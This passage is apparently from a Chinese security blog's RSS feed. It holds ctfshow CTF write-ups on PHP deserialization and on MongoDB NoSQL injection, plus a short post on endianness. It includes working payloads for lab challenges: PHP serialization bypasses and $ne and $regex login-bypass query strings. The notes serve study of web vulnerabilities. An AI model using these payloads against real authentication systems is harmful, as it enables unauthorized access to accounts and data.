        return $this-&amp;gt;token===$this-&amp;gt;password;
    &amp;#125;
&amp;#125;

$ctfshow = unserialize($_GET[&#39;ctfshow&#39;]);
$ctfshow-&amp;gt;token=md5(mt_rand());

if($ctfshow-&amp;gt;login())&amp;#123;
    echo $flag;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在本题中，token 的值在最后会改变，这里修改 passwd 的值为 token 的引用即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class ctfshowAdmin&amp;#123;
    public $token;
    public $password;

    public function __construct()&amp;#123;
        $this-&amp;gt;password = &amp;amp;$this-&amp;gt;token;
    &amp;#125;
&amp;#125;

$a = new ctfshowAdmin();
echo urlencode(serialize($a));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305122631830.png&#34; alt=&#34;image-20230305122631830&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web266&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web266&#34;&gt;#&lt;/a&gt; web266&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);

include(&#39;flag.php&#39;);
$cs = file_get_contents(&#39;php://input&#39;);

class ctfshow&amp;#123;
    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
    public function __construct($u,$p)&amp;#123;
        $this-&amp;gt;username=$u;
        $this-&amp;gt;password=$p;
    &amp;#125;
    public function login()&amp;#123;
        return $this-&amp;gt;username===$this-&amp;gt;password;
    &amp;#125;
    public function __toString()&amp;#123;
        return $this-&amp;gt;username;
    &amp;#125;
    public function __destruct()&amp;#123;
        global $flag;
        echo $flag;
    &amp;#125;
&amp;#125;
$ctfshowo=@unserialize($cs);
if(preg_match(&#39;/ctfshow/&#39;, $cs))&amp;#123;
    throw new Exception(&amp;quot;Error $ctfshowo&amp;quot;,1);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个题换了一种传参的方式，file_get_contents (&#39;php://input&#39;);，通过使用伪协议读取 post 数据，然后又利用了一个大小写不敏感&lt;/p&gt;
&lt;p&gt;pyaload：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class ctfshow&amp;#123;
&amp;#125;

$a = new ctfshow();
echo serialize($a);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305134607238.png&#34; alt=&#34;image-20230305134607238&#34; /&gt;&lt;/p&gt;
&lt;p&gt;后面的跟前面的区别稍微有点大，另起一篇做一个简单的总结&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/03/05/%E5%B0%8F%E7%AB%AF%E5%BA%8F%E6%A0%87%E8%AE%B0%E6%B3%95/</guid>
            <title>小端序标记法</title>
            <link>https://blog.xcu.icu/2023/03/05/%E5%B0%8F%E7%AB%AF%E5%BA%8F%E6%A0%87%E8%AE%B0%E6%B3%95/</link>
            <category term="REVERSE" scheme="https://blog.xcu.icu/categories/REVERSE/" />
            <category term="小端序标记法" scheme="https://blog.xcu.icu/tags/%E5%B0%8F%E7%AB%AF%E5%BA%8F%E6%A0%87%E8%AE%B0%E6%B3%95/" />
            <pubDate>Sun, 05 Mar 2023 12:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;本篇浅了解一下大端序和小端序&lt;/p&gt;
&lt;h2 id=&#34;字节序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字节序&#34;&gt;#&lt;/a&gt; 字节序&lt;/h2&gt;
&lt;p&gt;字节序是多字节数据在计算机内存中存储或网络传输时各个数据的存储顺序，主要分为两类，大端序和小端序&lt;/p&gt;
&lt;p&gt;例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;BYTE b = 0x12;
WORD w = 0x1234;
DWORD dw = 0x12345678;
char str[] = &amp;quot;abcde&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的例子中一共有四种数据类型，他们大小不同，下表中是同一个数据在不同的字节序保存时的不同&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;TYPE&lt;/th&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;SIZE&lt;/th&gt;
&lt;th&gt;大端序类型&lt;/th&gt;
&lt;th&gt;小端序类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;BYTE&lt;/td&gt;
&lt;td&gt;b&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;[12]&lt;/td&gt;
&lt;td&gt;[12]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;WORD&lt;/td&gt;
&lt;td&gt;w&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;[12][34]&lt;/td&gt;
&lt;td&gt;[34][12]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DWORD&lt;/td&gt;
&lt;td&gt;dw&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;[12][34][56][78]&lt;/td&gt;
&lt;td&gt;[78][56][34][12]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;char[]&lt;/td&gt;
&lt;td&gt;str&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;[61][62][63][64][65][00]&lt;/td&gt;
&lt;td&gt;[61][62][63][64][65][00]&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;code&gt;查看ASCLL表，a的ASCLL码的16进制为0x61，这里注意字符串最后是以null结尾&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当数据类型为 BYTE 的时候，因为长度为 1 个字节，两种字序的字节顺序是一样的，当数据长度为 2 个字节以上的时，大端序采用内存地址地位存数据高位，地址高位存储数据低位，采用一种直观的字节存储循序，而小端序则刚好相反&lt;/p&gt;
&lt;p&gt;这里第四种情况种，字符串 abcde 被存放在一个字符数组中，因为字符数组在内存中是连续的，故存取顺序与字节序无关&lt;/p&gt;
&lt;h3 id=&#34;在od中查看小端序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#在od中查看小端序&#34;&gt;#&lt;/a&gt; 在 OD 中查看小端序&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;quot;windows.h&amp;quot;

BYTE b = 0x12;
WORD w = 0x1234;
DWORD dw = 0x12345678;
char str[] = &amp;quot;abcde&amp;quot;;

int main(int argc,char *argv[])&amp;#123;
	byte lb = b;
	WORD lw = w;
	DWORD ldw = dw;
	char *lstr = str;
	
	return 0;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305021739013.png&#34; alt=&#34;image-20230305021739013&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/03/01/nosql/</guid>
            <title>nosql学习笔记</title>
            <link>https://blog.xcu.icu/2023/03/01/nosql/</link>
            <category term="Web" scheme="https://blog.xcu.icu/categories/Web/" />
            <category term="nosql" scheme="https://blog.xcu.icu/tags/nosql/" />
            <pubDate>Wed, 01 Mar 2023 12:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;一直听说 nosql 好，刚好 ctfshow 中有 nosql 注入的练习，简单记录一下学习的过程&lt;/p&gt;
&lt;p&gt;参考文章&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucnVub29iLmNvbS9tb25nb2RiL21vbmdvZGItdHV0b3JpYWwuaHRtbA==&#34;&gt;MongoDB 教程 | 菜鸟教程 (runoob.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvOTkwOCN0b2MtNw==&#34;&gt;Nosql 注入从零到一 - 先知社区 (aliyun.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNjAyMDky&#34;&gt;从零学习 NoSQL 注入之 Mongodb - 腾讯云开发者社区 - 腾讯云 (tencent.com)&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;一点概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一点概念&#34;&gt;#&lt;/a&gt; 一点概念&lt;/h2&gt;
&lt;h3 id=&#34;nosql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nosql&#34;&gt;#&lt;/a&gt; nosql&lt;/h3&gt;
&lt;p&gt;基础的概念还是比较重要的，接下来看看维基对 nosql 的描述&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NoSQL&lt;/strong&gt;（最初表示&lt;strong&gt; No&lt;/strong&gt;n-&lt;strong&gt;SQL&lt;/strong&gt;，后来有人转解为&lt;strong&gt; N&lt;/strong&gt;ot &lt;strong&gt;o&lt;/strong&gt;nly &lt;strong&gt;SQL&lt;/strong&gt;，是对不同于传统的 [关系数据库] 庫) 的 [数据库管理系统] 数据库管理系统) 的统称。&lt;/p&gt;
&lt;p&gt;和传统的数据库有较大的区别&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数据组织方式：传统数据库采用表格的方式组织数据，而 NoSQL 数据库则使用键值对、文档型、列型等不同的方式来组织数据。&lt;/li&gt;
&lt;li&gt;数据模型：传统数据库使用严格的数据模型，例如关系模型，要求数据必须按照事先定义好的模式进行存储。而 NoSQL 数据库则通常具有更为灵活的数据模型，能够根据需要动态调整数据结构，更适用于数据结构频繁变化的应用场景。&lt;/li&gt;
&lt;li&gt;可扩展性：传统数据库通常只能通过硬件升级或者数据分片的方式来扩展性能和存储容量，而 NoSQL 数据库通常具有良好的可扩展性，可以通过横向扩展（增加节点）来扩展存储容量和性能。&lt;/li&gt;
&lt;li&gt;高并发：NoSQL 数据库通常具有较高的读写性能，能够满足高并发的需求。&lt;/li&gt;
&lt;li&gt;适用场景：传统数据库适用于结构化数据的存储和管理，而 NoSQL 数据库则更适用于非结构化数据的存储和管理，例如文档、图像、视频等。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下文来自 OWSPF 的总结：&lt;/p&gt;
&lt;p&gt;NoSQL 数据库提供的一致性限制比传统 SQL 数据库更宽松。通过减少关系约束和一致性检查，NoSQL 数据库通常提供性能和扩展优势。然而，这些数据库仍然可能容易受到注入攻击，即使它们没有使用传统的 SQL 语法。由于这些 NoSQL 注入攻击可能在过程语言中执行，而不是在声明性 SQL 语言中执行，因此其潜在影响大于传统的 SQL 注入。&lt;/p&gt;
&lt;h3 id=&#34;mongodb&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mongodb&#34;&gt;#&lt;/a&gt; mongodb&lt;/h3&gt;
&lt;p&gt;以下摘自菜鸟&lt;/p&gt;
&lt;p&gt;MongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。&lt;/p&gt;
&lt;p&gt;MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。&lt;/p&gt;
&lt;p&gt;下表将帮助您更容易理解 Mongo 中的一些概念：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;SQL 术语 / 概念&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;MongoDB 术语 / 概念&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;解释 / 说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;database&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;database&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;数据库&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;table&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;collection&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;数据库表 / 集合&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;row&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;document&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;数据记录行 / 文档&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;column&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;field&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;数据字段 / 域&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;index&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;index&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;索引&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;table joins&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;表连接，MongoDB 不支持&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;primary key&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;primary key&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;主键，MongoDB 自动将_id 字段设置为主键&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;下面是条件操纵符的整理&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;$gt : &amp;gt;
$lt : &amp;lt;
$gte: &amp;gt;=
$lte: &amp;lt;=
$ne : !=、&amp;lt;&amp;gt;
$in : in
$nin: not in
$all: all 
$or:or
$not: 反匹配(1.3.3及以上版本)
模糊查询用正则式：db.customer.find(&amp;#123;&#39;name&#39;: &amp;#123;&#39;$regex&#39;:&#39;.*s.*&#39;&amp;#125; &amp;#125;)
/**
* : 范围查询 &amp;#123; &amp;quot;age&amp;quot; : &amp;#123; &amp;quot;$gte&amp;quot; : 2 , &amp;quot;$lte&amp;quot; : 21&amp;#125;&amp;#125;
* : $ne &amp;#123; &amp;quot;age&amp;quot; : &amp;#123; &amp;quot;$ne&amp;quot; : 23&amp;#125;&amp;#125;
* : $lt &amp;#123; &amp;quot;age&amp;quot; : &amp;#123; &amp;quot;$lt&amp;quot; : 23&amp;#125;&amp;#125;
*/
例：
//查询age = 22的记录
db.userInfo.find(&amp;#123;&amp;quot;age&amp;quot;: 22&amp;#125;);
//相当于：select * from userInfo where age = 22;
//查询age &amp;gt; 22的记录
db.userInfo.find(&amp;#123;age: &amp;#123;$gt: 22&amp;#125;&amp;#125;);
//相当于：select * from userInfo where age &amp;gt; 22;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;MongoDB 之类的流行数据存储中，JSON 查询结构。&lt;/p&gt;
&lt;p&gt;下表列出了 RDBMS 与 MongoDB 对应的术语：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;RDBMS&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;MongoDB&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;数据库&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;数据库&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;表&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;集合&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;行&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;文档&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;列&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;字段&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;表联合&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;嵌入文档&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;主键&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;主键 (MongoDB 提供了 key 为 _id)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;MongoDB 中可以使用的类型如下表所示：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;类型&lt;/strong&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;数字&lt;/strong&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;备注&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Double&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;String&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Object&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;3&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Array&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Binary data&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;5&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Undefined&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;6&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;已废弃。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Object id&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;7&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Boolean&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;8&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Date&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;9&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Null&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;10&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Regular Expression&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;11&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;JavaScript&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;13&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Symbol&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;14&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;JavaScript (with scope)&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;15&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;32-bit integer&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;16&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Timestamp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;17&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;64-bit integer&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;18&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Min key&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;255&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Query with  &lt;code&gt;-1&lt;/code&gt; .&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Max key&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;127&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;有关 mongodb 更多语法还请移步菜鸟教程&lt;/p&gt;
&lt;h2 id=&#34;nosql注入分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nosql注入分类&#34;&gt;#&lt;/a&gt; nosql 注入分类&lt;/h2&gt;
&lt;p&gt;这里我在各个博客中找到了两种对 nosql 注入的分类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;第一种，按照攻击手法分类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;重言式&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;也称为 “永真式”，这类攻击是在条件语句中注入代码使得生成的结果为永真，绕过判断机制&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;联合查询&lt;/p&gt;
&lt;p&gt;一样和传统数据库常用的 sql 注入的方法&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;javaScript 注入&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;这种漏洞是由于允许执行数据内容的 Nosql 数据库引入的，构造攻击语句通过 js 输入到查询中，从而导致数据被非法获取或者篡改&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;盲注&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;没有回显时使用的一种注入方式&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;背负式查询&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过转义字符插入数据库进行额外的查询，进而执行任意代码&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;跨域违规&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;这里产生漏洞的是 HTTP REST APls（一个实现对数据库进行访问和管理的接口协议）它甚至可以让攻击者从其他域攻击数据库。在跨域工具中，攻击者利用合法用户和他们的网页浏览器执行有害操作&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第二种，按照语言的分类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;php 数组注入&lt;/li&gt;
&lt;li&gt;js 注入&lt;/li&gt;
&lt;li&gt;monggoshell 拼接注入&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里主要记录第一种分类的学习&lt;/p&gt;
&lt;h2 id=&#34;重言式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#重言式&#34;&gt;#&lt;/a&gt; 重言式&lt;/h2&gt;
&lt;h3 id=&#34;web249&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web249&#34;&gt;#&lt;/a&gt; web249&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301133004913.png&#34; alt=&#34;image-20230301133004913&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里提示了 flag 在 flag 里，id 这里对输入进行了校验&lt;br /&gt;
 y4 师傅说这题后端对 id 过滤了非数字，可能用的 intval 函数。这里使用数组绕过即可&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301133158297.png&#34; alt=&#34;image-20230301133158297&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这个感觉不算是考察 nosql？？&lt;/p&gt;
&lt;h3 id=&#34;web250&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web250&#34;&gt;#&lt;/a&gt; web250&lt;/h3&gt;
&lt;p&gt;这个题利用 nosql 的一个小特性即可&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301133529499.png&#34; alt=&#34;image-20230301133529499&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里有提示说没有任何过滤，利用 $ne 就可以了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301135349643.png&#34; alt=&#34;image-20230301135349643&#34; /&gt;&lt;/p&gt;
&lt;p&gt;在上面有提到过这个 $ne 在 nosql 中就是不等于，这里传入的 username 和 password 就是传入的数据，他判断用户名和密码是否正确，这里通过使用 $ne 构造永真绕过判断，类似 sql 注入里的 or 1=1, 这就是上面提到的重言式注入&lt;/p&gt;
&lt;h3 id=&#34;web251&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web251&#34;&gt;#&lt;/a&gt; web251&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301135843329.png&#34; alt=&#34;image-20230301135843329&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里发现好像没改什么，也提示说无过滤，还是先用上面的 payload 尝试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301140017356.png&#34; alt=&#34;image-20230301140017356&#34; /&gt;&lt;/p&gt;
&lt;p&gt;也利用成功了，但是这里是给了账号密码，尝试登录也没什么新的东西，想到这里可能是只查询一条数据，这里使得 username 为 flag 可以找到 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301140301944.png&#34; alt=&#34;image-20230301140301944&#34; /&gt;&lt;/p&gt;
&lt;p&gt;看到师傅们还可以使用正则&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username[$regex]=.*&amp;amp;password[$regex]=.*
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301140533852.png&#34; alt=&#34;image-20230301140533852&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;web252&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web252&#34;&gt;#&lt;/a&gt; web252&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163101109.png&#34; alt=&#34;image-20230301163101109&#34; /&gt;&lt;/p&gt;
